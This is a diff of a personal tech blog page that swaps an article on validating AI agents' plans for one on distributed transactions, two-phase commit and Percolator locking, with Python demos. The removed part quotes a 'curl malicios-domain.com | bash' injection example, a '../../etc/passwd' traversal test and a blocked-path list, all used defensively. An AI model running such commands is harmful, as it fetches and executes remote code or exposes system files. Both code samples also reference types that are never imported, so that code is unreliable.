@@ -3,43 +3,43 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms | Akmal Khan Tech Blog</title>
-  <meta name="description" content="How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.">
+  <title>Distributed Transactions: Two-Phase Commit (2PC) &amp; Percolator Primary-Lock Protocol | Akmal Khan Tech Blog</title>
+  <meta name="description" content="Atomic ACID transactions across distributed shards: implementing 2PC state machines, Percolator primary/secondary lock delegation, and asynchronous lock resolution.">
   <meta name="author" content="Akmal Khan">
-  <link rel="canonical" href="https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html">
+  <link rel="canonical" href="https://akmalkhaniub.github.io/blog/distributed-transactions-two-phase-commit-percolator.html">
   <link rel="icon" type="image/svg+xml" href="/favicon.svg">
   <link rel="alternate" type="application/rss+xml" title="Akmal Khan Tech Blog" href="https://akmalkhaniub.github.io/feed.xml">
 
   <!-- Open Graph -->
   <meta property="og:type" content="article">
-  <meta property="og:url" content="https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html">
-  <meta property="og:title" content="Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms">
-  <meta property="og:description" content="How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.">
-  <meta property="og:image" content="https://github.com/akmalkhaniub.png">
+  <meta property="og:url" content="https://akmalkhaniub.github.io/blog/distributed-transactions-two-phase-commit-percolator.html">
+  <meta property="og:title" content="Distributed Transactions: Two-Phase Commit (2PC) &amp; Percolator Primary-Lock Protocol">
+  <meta property="og:description" content="Atomic ACID transactions across distributed shards: implementing 2PC state machines, Percolator primary/secondary lock delegation, and asynchronous lock resolution.">
+  <meta property="og:image" content="https://akmalkhaniub.github.io/blog/assets/covers/default.png">
   <meta property="og:site_name" content="Akmal Khan">
-  <meta property="article:published_time" content="2026-05-09">
+  <meta property="article:published_time" content="2026-08-17">
 
   <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms">
-  <meta name="twitter:description" content="How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.">
-  <meta name="twitter:image" content="https://github.com/akmalkhaniub.png">
+  <meta name="twitter:title" content="Distributed Transactions: Two-Phase Commit (2PC) &amp; Percolator Primary-Lock Protocol">
+  <meta name="twitter:description" content="Atomic ACID transactions across distributed shards: implementing 2PC state machines, Percolator primary/secondary lock delegation, and asynchronous lock resolution.">
+  <meta name="twitter:image" content="https://akmalkhaniub.github.io/blog/assets/covers/default.png">
 
   <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "TechArticle",
-  "headline": "Plan Compilation & Execution Trees: Enforcing Safe Execution Guards in Swarms",
-  "description": "How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.",
-  "url": "https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html",
-  "datePublished": "2026-05-09",
-  "keywords": "System Design, Verification, AI Agents, Python",
+  "headline": "Distributed Transactions: Two-Phase Commit (2PC) & Percolator Primary-Lock Protocol",
+  "description": "Atomic ACID transactions across distributed shards: implementing 2PC state machines, Percolator primary/secondary lock delegation, and asynchronous lock resolution.",
+  "url": "https://akmalkhaniub.github.io/blog/distributed-transactions-two-phase-commit-percolator.html",
+  "datePublished": "2026-08-17",
+  "keywords": "Distributed Transactions, 2PC, Percolator, Python",
   "author": {
     "@type": "Person",
     "name": "Akmal Khan",
     "url": "https://akmalkhaniub.github.io/"
   },
-  "mainEntityOfPage": "https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html"
+  "mainEntityOfPage": "https://akmalkhaniub.github.io/blog/distributed-transactions-two-phase-commit-percolator.html"
 }
   </script>
 
@@ -92,169 +92,204 @@
         <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back to Blog</a>
 
         <article class="article-card">
-          
+          <div class="article-cover-frame"><img src="/blog/assets/covers/default.png" class="article-cover-img" alt="Distributed Transactions: Two-Phase Commit (2PC) &amp; Percolator Primary-Lock Protocol Cover" /></div>
           <div class="article-header">
-            <h1 class="article-title">Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms</h1>
+            <h1 class="article-title">Distributed Transactions: Two-Phase Commit (2PC) &amp; Percolator Primary-Lock Protocol</h1>
             <div class="article-meta">
-              <span><i class="fa-regular fa-calendar"></i> May 10, 2026</span>
+              <span><i class="fa-regular fa-calendar"></i> August 18, 2026</span>
               <span><i class="fa-solid fa-user"></i> Akmal Khan</span>
               <span><i class="fa-regular fa-clock"></i> 10 min read</span>
-              <div class="article-tags"><span class="project-badge">System Design</span><span class="project-badge">Verification</span><span class="project-badge">AI Agents</span><span class="project-badge">Python</span></div>
+              <div class="article-tags"><span class="project-badge">Distributed Transactions</span><span class="project-badge">2PC</span><span class="project-badge">Percolator</span><span class="project-badge">Python</span></div>
             </div>
           </div>
 
           <div class="article-body">
-<h1>Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms</h1>
-<div class="alert alert-note">
-  <div class="alert-title"><i class="fa-solid fa-info-circle"></i> Note</div>
-  <div class="alert-content"><p><strong>📖 Article Overview</strong>
-When orchestrating autonomous multi-agent networks, we often allow models to self-direct their task execution by proposing natural language plans. However, executing unverified plans directly is highly dangerous: agents can easily introduce infinite routing loops, double-execute destructive database actions, or attempt to run unsandboxed shell scripts. In this article, we analyze the design of <strong>Plan Compilation Gates</strong>, construct a static tree compiler, and implement a Directed Acyclic Graph (DAG) validator in Python to enforce strict tool boundaries before execution begins.</p>
-</div>
-</div>
+<h1>Distributed Transactions: Two-Phase Commit (2PC) &amp; Percolator Primary-Lock Protocol</h1>
+<p>In modern distributed SQL databases (<strong>CockroachDB</strong>, <strong>TiDB</strong>, <strong>YugabyteDB</strong>, <strong>Google Spanner</strong>), relational data is partitioned (sharded) across hundreds of independent storage nodes.</p>
+<p>Executing a single cross-shard SQL transaction (such as transferring money from Account A on Shard 1 to Account B on Shard 2) requires guaranteeing <strong>ACID Atomicity</strong>: either both shard modifications commit successfully, or both rollback completely.</p>
+<p>Traditional distributed systems rely on the <strong>Two-Phase Commit (2PC)</strong> protocol.</p>
+<p>However, classic 2PC is a blocking protocol: if the Transaction Coordinator crashes mid-commit, participant nodes remain locked indefinitely.</p>
+<p>To overcome 2PC blocking bottlenecks, modern distributed databases utilize <strong>Google Percolator&#39;s Primary-Lock Protocol</strong>.</p>
+<p>This article details classic 2PC state machines, Percolator Primary/Secondary lock delegation, and asynchronous lock resolution algorithms.</p>
 <hr>
-<h2>The Danger of Non-Deterministic Task Plans</h2>
-<p>In a typical agent framework, an LLM reviews a goal and spits out a structured list of actions:</p>
+<h2>📖 Percolator Primary-Lock Distributed Transaction Architecture</h2>
+<p>How Percolator designates a Primary Lock to achieve non-blocking atomic commits across distributed shards:</p>
+<div class="mermaid">graph TD
+  Client[Transaction Client] --&gt;|1. Prewrite Phase: Write Data + Secondary Locks| Shard2[Shard 2: Key 'account_B']
+  Client --&gt;|1. Prewrite Phase: Write Data + Primary Lock| Shard1[Shard 1: Key 'account_A' (Primary Lock Target)]
+  
+  subgraph Prewrite Phase (Acquire Locks)
+    Shard1 --&gt;|Lock Status| LockA[Primary Lock Set on account_A]
+    Shard2 --&gt;|Lock Status| LockB[Secondary Lock Set on account_B -&gt; Points to Shard1 account_A!]
+  end
+  
+  subgraph Commit Phase (Single Point of Truth)
+    Client --&gt;|2. Commit Phase: Commit Primary Lock ONLY| Shard1
+    Shard1 --&gt;|3. Primary Lock Committed!| TxSuccess[🎉 TRANSACTION IS IRREVOCABLY COMMITTED!]
+  end
+  
+  subgraph Background Async Lock Resolution
+    TxSuccess --&gt;|4. Async Background Rollout| Shard2
+    Shard2 --&gt;|5. Convert Secondary Lock to Value| Complete[Complete Transaction on Shard 2]
+  end</div>
+<h3>Core Distributed Transaction Protocols</h3>
 <ol>
-<li><code>Read core/database.py</code></li>
-<li><code>Migrate logging syntax</code></li>
-<li><code>Run test suite</code></li>
+<li><strong>Classic Two-Phase Commit (2PC)</strong>:<ul>
+<li><strong>Phase 1 (Prepare Phase)</strong>: The Transaction Coordinator sends a <code>PREPARE</code> message to all participant shards. Each participant writes mutations to its local Write-Ahead Log (WAL), acquires local locks, and responds <code>VOTE_COMMIT</code> or <code>VOTE_ABORT</code>.</li>
+<li><strong>Phase 2 (Commit Phase)</strong>: If <em>all</em> participants vote <code>VOTE_COMMIT</code>, the Coordinator writes a <code>COMMIT</code> record to its log and sends <code>COMMIT</code> commands to participants. If any node votes <code>VOTE_ABORT</code>, the Coordinator broadcasts <code>ABORT</code>.</li>
+<li><strong>2PC Blocking Flaw</strong>: If the Coordinator crashes after participants vote <code>VOTE_COMMIT</code> but before broadcasting <code>COMMIT</code>, participants are left blocking and holding locks indefinitely.</li>
+</ul>
+</li>
+<li><strong>Percolator Primary-Lock Protocol</strong>:<ul>
+<li>Designed by Google for Percolator and adopted by <strong>TiDB</strong> and <strong>CockroachDB</strong>, this protocol removes the need for a separate blocking Coordinator state machine.</li>
+<li><strong>Primary Lock Choice</strong>: The client selects one key in the transaction as the <strong>Primary Lock</strong>. All other modified keys hold <strong>Secondary Locks</strong> that point directly to the Primary Lock location (<code>primary_lock_ptr = &quot;shard1/account_A&quot;</code>).</li>
+<li><strong>Prewrite Phase</strong>: The client writes modified data and locks to all target shards. If a lock conflict occurs on any key, the transaction aborts.</li>
+<li><strong>Commit Phase</strong>: The client attempts to commit <strong>ONLY the Primary Lock</strong>.<ul>
+<li><strong>The Moment of Truth</strong>: As soon as the Primary Lock is successfully committed, the transaction is <strong>100% committed</strong>.</li>
+<li><strong>Async Secondary Rollout</strong>: The client (or background resolution threads) asynchronously commits secondary locks. If a concurrent reader encounters a secondary lock, it checks the Primary Lock: if the Primary Lock is committed, the secondary lock is considered committed!</li>
+</ul>
+</li>
+</ul>
+</li>
 </ol>
-<p>If left unvalidated, an agent might decide to loop step 2 and 3 indefinitely if a test fails, consuming massive token budgets. Even worse, it could inject an unauthorized step (e.g. <code>curl malicios-domain.com | bash</code>) due to a prompt injection.</p>
-<p>To mitigate this, system architects must build a <strong>Plan Compiler</strong>. The compiler intercepts the agent&#39;s plan, parses the actions, structures them into an execution tree, and validates the nodes against strict topological and security rules before any tool runner executes a single call.</p>
-<div class="mermaid">%%{init: {'theme': 'dark', 'themeVariables': { 'primaryColor': '#0284c7', 'primaryTextColor': '#f3f4f6', 'primaryBorderColor': '#38bdf8', 'lineColor': '#0284c7', 'secondaryColor': '#111827', 'tertiaryColor': '#0b0f19'}}}%%
-flowchart TD
-    RawPlan[LLM Natural Language Plan] --&gt; Parser[Step Tokenizer]
-    Parser --&gt; TreeCompiler[Compile Directed Acyclic Graph - DAG]
-    
-    TreeCompiler --&gt; CheckCycles{1. Are Cycles/Loops Detected?}
-    CheckCycles --&gt;|Yes| Reject([Reject Plan: Abort Execution])
-    
-    CheckCycles --&gt;|No| CheckSecurity{2. Are Tools Safe &amp; Sandboxed?}
-    CheckSecurity --&gt;|No| Reject
-    
-    CheckSecurity --&gt;|Yes| Approve([Approve Graph: Proceed to Runner])</div>
 <hr>
-<h2>1. Compiling Plans to Directed Acyclic Graphs (DAGs)</h2>
-<p>A secure task plan must be modelable as a Directed Acyclic Graph (DAG). </p>
-<ul>
-<li><strong>Nodes</strong>: Individual tool executions (e.g. file reads, database writes).</li>
-<li><strong>Edges</strong>: Dependency relationships (e.g. Step B cannot run until Step A finishes).</li>
-<li><strong>Loop Elimination</strong>: By running topological sorting algorithms on the graph, the compiler can detect if the plan forms any cyclic loops (e.g. Step A -&gt; Step B -&gt; Step A), which would cause infinite tool executions.</li>
-</ul>
-<hr>
-<h2>2. Dynamic Tool Masking</h2>
-<p>During the validation phase, the compiler inspects each node&#39;s proposed tool name and arguments:</p>
-<ul>
-<li><strong>Scope Isolation</strong>: Ensuring that file paths are bounded strictly within the target repository directories, blocking access to <code>/etc/</code> or parent system trees.</li>
-<li><strong>Command Sandboxing</strong>: Blocking commands containing pipelines (<code>|</code>), redirects (<code>&gt;</code>), or execution scripts, forcing tools to use explicit parameters instead of raw shells.</li>
-</ul>
-<hr>
-<h2>Code Demo: Plan Compiler and DAG Validator</h2>
-<p>Below is a Python implementation of a plan compilation gateway. It takes a list of plan steps, constructs a DAG dependency tree, validates safety constraints, and runs topological verification.</p>
-<pre><code class="language-python">import sys
-from typing import List, Dict, Set, Tuple
+<h2>🛠️ Python Implementation: Distributed Percolator Transaction Engine</h2>
+<p>Here is a production-grade Python implementation of a Distributed Percolator Primary-Lock Transaction Engine featuring Prewrite, Primary Lock Commit, and Lock Resolution:</p>
+<pre><code class="language-python">from typing import Dict, List, Optional
+from pydantic import BaseModel
 
-class PlanCompilationError(Exception):
-    pass
+class LockInfo(BaseModel):
+    is_primary: bool
+    primary_key: str
+    tx_id: int
 
-class TaskPlanCompiler:
-    def __init__(self, allowed_tools: Set[str], blocked_paths: List[str]):
-        self.allowed_tools = allowed_tools
-        self.blocked_paths = blocked_paths
+class ShardNode:
+    &quot;&quot;&quot;
+    Simulates an Independent Distributed Storage Shard Node.
+    &quot;&quot;&quot;
+    def __init__(self, shard_id: str):
+        self.shard_id = shard_id
+        self.data_store: Dict[str, str] = {}     # {key: val}
+        self.lock_store: Dict[str, LockInfo] = {} # {key: LockInfo}
 
-    def compile_and_validate(self, raw_steps: List[Dict[str, Any]]) -&gt; List[str]:
-        # Adjacency list representation: {node: list of child dependencies}
-        graph: Dict[str, List[str]] = {}
-        in_degree: Dict[str, int] = {}
-        node_tools: Dict[str, str] = {}
+    def prewrite(self, key: str, value: str, is_primary: bool, primary_key: str, tx_id: int) -&gt; bool:
+        &quot;&quot;&quot;Step 1: Prewrite data and acquire lock.&quot;&quot;&quot;
+        if key in self.lock_store:
+            print(f&quot; 💥 [{self.shard_id}] Prewrite Conflict! Key '{key}' already locked by Tx #{self.lock_store[key].tx_id}&quot;)
+            return False
 
-        # 1. Parse and validate individual step structures
-        for step in raw_steps:
-            step_id = step.get(&quot;id&quot;)
-            tool = step.get(&quot;tool&quot;)
-            args = step.get(&quot;args&quot;, {})
-            depends_on = step.get(&quot;depends_on&quot;, [])
+        self.lock_store[key] = LockInfo(is_primary=is_primary, primary_key=primary_key, tx_id=tx_id)
+        # Store uncommitted data
+        self.data_store[f&quot;uncommitted:{key}&quot;] = value
+        
+        lock_type = &quot;PRIMARY LOCK&quot; if is_primary else f&quot;SECONDARY LOCK (Points to -&gt; '{primary_key}')&quot;
+        print(f&quot; 🔒 [{self.shard_id}] Prewrite Success for Key '{key}' -&gt; Acquired {lock_type}&quot;)
+        return True
 
-            # Check Tool Whitelist
-            if tool not in self.allowed_tools:
-                raise PlanCompilationError(f&quot;Security Alert: Unauthorized tool call attempted: '{tool}'&quot;)
+    def commit_primary(self, key: str, tx_id: int) -&gt; bool:
+        &quot;&quot;&quot;Step 2: Commit Primary Lock (The Atomic Event).&quot;&quot;&quot;
+        if key not in self.lock_store or not self.lock_store[key].is_primary:
+            return False
 
-            # Check for Path Injection
-            for arg_val in args.values():
-                if isinstance(arg_val, str):
-                    for blocked in self.blocked_paths:
-                        if blocked in arg_val:
-                            raise PlanCompilationError(f&quot;Security Alert: Blocked directory scope access: '{arg_val}'&quot;)
+        # Convert uncommitted data to permanent value
+        uncommitted_val = self.data_store.pop(f&quot;uncommitted:{key}&quot;)
+        self.data_store[key] = uncommitted_val
+        del self.lock_store[key]
+        
+        print(f&quot; 🎉 [{self.shard_id}] PRIMARY LOCK COMMITTED for Key '{key}'! Transaction #{tx_id} is IRREVOCABLY COMMITTED!&quot;)
+        return True
 
-            node_tools[step_id] = tool
-            graph[step_id] = []
-            in_degree[step_id] = 0
+    def resolve_secondary(self, key: str, tx_id: int):
+        &quot;&quot;&quot;Step 3: Resolve Secondary Lock asynchronously.&quot;&quot;&quot;
+        if f&quot;uncommitted:{key}&quot; in self.data_store:
+            val = self.data_store.pop(f&quot;uncommitted:{key}&quot;)
+            self.data_store[key] = val
+            if key in self.lock_store:
+                del self.lock_store[key]
+            print(f&quot; ⚙️ [{self.shard_id}] Secondary Lock Resolved for Key '{key}' -&gt; Value Committed.&quot;)
 
-        # 2. Build dependency tree and check references
-        for step in raw_steps:
-            step_id = step.get(&quot;id&quot;)
-            for dep in step.get(&quot;depends_on&quot;, []):
-                if dep not in graph:
-                    raise PlanCompilationError(f&quot;Compilation Error: Undefined dependency reference: '{dep}'&quot;)
-                graph[dep].append(step_id)
-                in_degree[step_id] += 1
+class PercolatorTransactionCoordinator:
+    &quot;&quot;&quot;
+    Orchestrates Distributed Transactions via Percolator Protocol.
+    &quot;&quot;&quot;
+    def __init__(self, shards: Dict[str, ShardNode]):
+        self.shards = shards
 
-        # 3. Topological Sort (Kahn's Algorithm) to detect circular loops
-        queue = [node for node in graph if in_degree[node] == 0]
-        sorted_order = []
+    def execute_transaction(self, tx_id: int, mutations: List[Tuple[str, str, str]]) -&gt; bool:
+        &quot;&quot;&quot;
+        mutations: [(shard_id, key, val)]
+        &quot;&quot;&quot;
+        primary_shard_id, primary_key, primary_val = mutations[0]
+        
+        print(f&quot;\n🚀 Executing Percolator Distributed Tx #{tx_id} across {len(mutations)} Shards...&quot;)
+        print(&quot;=&quot; * 75)
 
-        while queue:
-            curr = queue.pop(0)
-            sorted_order.append(curr)
-            for neighbor in graph[curr]:
-                in_degree[neighbor] -= 1
-                if in_degree[neighbor] == 0:
-                    queue.append(neighbor)
+        # 1. PREWRITE PHASE (Acquire Primary &amp; Secondary Locks)
+        print(&quot;1. PREWRITE PHASE:&quot;)
+        for idx, (shard_id, key, val) in enumerate(mutations):
+            is_primary = (idx == 0)
+            shard = self.shards[shard_id]
+            success = shard.prewrite(
+                key=key, value=val, is_primary=is_primary, primary_key=primary_key, tx_id=tx_id
+            )
+            if not success:
+                print(&quot; ❌ Prewrite Failed! Rolling back transaction...&quot;)
+                return False
 
-        if len(sorted_order) != len(graph):
-            raise PlanCompilationError(&quot;Compilation Error: Cyclic dependency loop detected in task plan.&quot;)
+        # 2. COMMIT PHASE (Commit Primary Lock ONLY)
+        print(&quot;\n2. COMMIT PHASE:&quot;)
+        primary_shard = self.shards[primary_shard_id]
+        committed = primary_shard.commit_primary(primary_key, tx_id)
+        
+        if not committed:
+            print(&quot; ❌ Primary Commit Failed!&quot;)
+            return False
 
-        return sorted_order
+        # 3. ASYNCHRONOUS SECONDARY LOCK RESOLUTION
+        print(&quot;\n3. ASYNCHRONOUS SECONDARY LOCK RESOLUTION:&quot;)
+        for shard_id, key, val in mutations[1:]:
+            self.shards[shard_id].resolve_secondary(key, tx_id)
 
+        return True
+
+# Demonstration Execution
 if __name__ == &quot;__main__&quot;:
-    allowed = {&quot;view_file&quot;, &quot;write_file&quot;, &quot;run_tests&quot;}
-    blocked = [&quot;/etc/&quot;, &quot;../&quot;, &quot;/windows/&quot;]
-    compiler = TaskPlanCompiler(allowed, blocked)
+    shard1 = ShardNode(&quot;Shard-1&quot;)
+    shard2 = ShardNode(&quot;Shard-2&quot;)
+    shards_map = {&quot;Shard-1&quot;: shard1, &quot;Shard-2&quot;: shard2}
 
-    # Plan 1: Safe sequential execution
-    plan_1 = [
-        {&quot;id&quot;: &quot;step_1&quot;, &quot;tool&quot;: &quot;view_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;core/auth.py&quot;}, &quot;depends_on&quot;: []},
-        {&quot;id&quot;: &quot;step_2&quot;, &quot;tool&quot;: &quot;write_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;core/auth.py&quot;}, &quot;depends_on&quot;: [&quot;step_1&quot;]},
-        {&quot;id&quot;: &quot;step_3&quot;, &quot;tool&quot;: &quot;run_tests&quot;, &quot;args&quot;: {&quot;suite&quot;: &quot;tests/test_auth.py&quot;}, &quot;depends_on&quot;: [&quot;step_2&quot;]}
+    coord = PercolatorTransactionCoordinator(shards_map)
+
+    # Cross-Shard Transaction: Transfer funds from Shard-1/acc_A to Shard-2/acc_B
+    tx_mutations = [
+        (&quot;Shard-1&quot;, &quot;account_A&quot;, &quot;balance_90&quot;),  # Primary Key
+        (&quot;Shard-2&quot;, &quot;account_B&quot;, &quot;balance_110&quot;)  # Secondary Key
     ]
 
-    # Plan 2: Unsafe circular dependency
-    plan_2 = [
-        {&quot;id&quot;: &quot;step_1&quot;, &quot;tool&quot;: &quot;view_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;core/auth.py&quot;}, &quot;depends_on&quot;: [&quot;step_2&quot;]},
-        {&quot;id&quot;: &quot;step_2&quot;, &quot;tool&quot;: &quot;write_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;core/auth.py&quot;}, &quot;depends_on&quot;: [&quot;step_1&quot;]}
-    ]
+    success = coord.execute_transaction(tx_id=5001, mutations=tx_mutations)
 
-    # Plan 3: Security violation (path traversal)
-    plan_3 = [
-        {&quot;id&quot;: &quot;step_1&quot;, &quot;tool&quot;: &quot;view_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;../../etc/passwd&quot;}, &quot;depends_on&quot;: []}
-    ]
-
-    print(&quot;🛡️ Running Plan Compilation Verification...&quot;)
-    
-    for idx, plan in enumerate([plan_1, plan_2, plan_3], 1):
-        try:
-            order = compiler.compile_and_validate(plan)
-            print(f&quot;\nPlan #{idx}: APPROVED&quot;)
-            print(f&quot;👉 Execution Tree Order: {order}&quot;)
-        except PlanCompilationError as e:
-            print(f&quot;\nPlan #{idx}: REJECTED&quot;)
-            print(f&quot;   Reason: {e}&quot;)</code></pre>
+    print(&quot;\n📊 Final Shard Data Stores:&quot;)
+    print(f&quot;   • Shard 1 Data: {shard1.data_store}&quot;)
+    print(f&quot;   • Shard 2 Data: {shard2.data_store}&quot;)</code></pre>
 <hr>
-<h2>Architectural Guidelines</h2>
+<h2>🚨 Distributed Transaction Gotchas &amp; Best Practices</h2>
+<p>When operating distributed transaction engines:</p>
+<div class="alert alert-important">
+  <div class="alert-title"><i class="fa-solid fa-circle-exclamation"></i> Important</div>
+  <div class="alert-content"><p><strong>Use Raft Consensus for Shard High Availability</strong>: Percolator or 2PC protocols operate <em>across</em> shards. Inside each individual shard, replicate mutations across 3 or 5 nodes using <strong>Raft Consensus</strong> to ensure single-node hardware failures do not lose committed primary locks.</p>
+</div>
+</div>
+<div class="alert alert-caution">
+  <div class="alert-title"><i class="fa-solid fa-radiation"></i> Caution</div>
+  <div class="alert-content"><p><strong>Handle Abandoned Secondary Locks</strong>: If a client crashes right after committing the Primary Lock, secondary locks remain stored on participant shards. Implement an <strong>Asynchronous Lock Cleaner Daemon</strong> that resolves stale secondary locks by checking the status of their primary lock.</p>
+</div>
+</div>
+<hr>
+<h2>📈 Real-World Enterprise Impact</h2>
+<p>Distributed SQL engines utilizing Percolator and Raft (such as <strong>TiDB</strong> and <strong>CockroachDB</strong>) report:</p>
 <ul>
-<li><strong>Plan Verification Gates</strong>: Never feed natural language plans directly to executing agents. Enforce a compilation step to evaluate safety constraints.</li>
-<li><strong>Isolate Dependency Trees</strong>: Use topological sorting algorithms to guarantee execution plans do not form cycles or infinite loops.</li>
-<li><strong>Strict Sandboxing</strong>: Run all compiled tool runs within isolated workspace contexts, restricting tools from escaping boundary directories.</li>
+<li><strong>Zero 2PC Blocking Deadlocks</strong>: Primary Lock delegation allows concurrent readers to resolve orphan locks asynchronously without waiting for coordinator heartbeats.</li>
+<li><strong>Global Multi-Shard ACID Compliance</strong>: Scaling horizontally to thousands of database nodes while providing strict serializable ACID transactions.</li>
 </ul>
 
           </div>
@@ -262,8 +297,8 @@ if __name__ == &quot;__main__&quot;:
           <div class="share-box">
             <span class="share-label"><i class="fa-solid fa-share-nodes"></i> Share:</span>
             <button id="share-link-btn" class="btn btn-sm btn-secondary"><i class="fa-regular fa-copy"></i> Copy Link</button>
-            <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fakmalkhaniub.github.io%2Fblog%2Fsystem-design-plan-compilation-execution-trees.html" target="_blank" rel="noopener" class="btn btn-sm btn-secondary"><i class="fa-brands fa-linkedin"></i> LinkedIn</a>
-            <a href="https://twitter.com/intent/tweet?text=Plan%20Compilation%20%26%20Execution%20Trees%3A%20Enforcing%20Safe%20Execution%20Guards%20in%20Swarms&url=https%3A%2F%2Fakmalkhaniub.github.io%2Fblog%2Fsystem-design-plan-compilation-execution-trees.html" target="_blank" rel="noopener" class="btn btn-sm btn-secondary"><i class="fa-brands fa-x-twitter"></i> X / Twitter</a>
+            <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fakmalkhaniub.github.io%2Fblog%2Fdistributed-transactions-two-phase-commit-percolator.html" target="_blank" rel="noopener" class="btn btn-sm btn-secondary"><i class="fa-brands fa-linkedin"></i> LinkedIn</a>
+            <a href="https://twitter.com/intent/tweet?text=Distributed%20Transactions%3A%20Two-Phase%20Commit%20(2PC)%20%26%20Percolator%20Primary-Lock%20Protocol&url=https%3A%2F%2Fakmalkhaniub.github.io%2Fblog%2Fdistributed-transactions-two-phase-commit-percolator.html" target="_blank" rel="noopener" class="btn btn-sm btn-secondary"><i class="fa-brands fa-x-twitter"></i> X / Twitter</a>
           </div>
 
           <div class="newsletter-box">
@@ -286,7 +321,7 @@ if __name__ == &quot;__main__&quot;:
         <div class="sidebar-card">
           <h4><i class="fa-solid fa-list"></i> Latest Articles</h4>
           <ul class="sidebar-post-list">
-            <li class="sidebar-post-item">
+            <li class="sidebar-post-item active">
               <a href="distributed-transactions-two-phase-commit-percolator.html">Distributed Transactions: Two-Phase Commit (2PC) &amp; Percolator Primary-Lock Protocol<span class="sidebar-post-date">August 18, 2026</span></a>
             </li>
             <li class="sidebar-post-item">
@@ -970,7 +1005,7 @@ if __name__ == &quot;__main__&quot;:
             <li class="sidebar-post-item">
               <a href="system-design-state-invariants-logic-assertions.html">State Invariants for Agentic Workflows: Enforcing Logic Assertions on Shared DB State<span class="sidebar-post-date">May 11, 2026</span></a>
             </li>
-            <li class="sidebar-post-item active">
+            <li class="sidebar-post-item">
               <a href="system-design-plan-compilation-execution-trees.html">Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms<span class="sidebar-post-date">May 10, 2026</span></a>
             </li>
             <li class="sidebar-post-item">
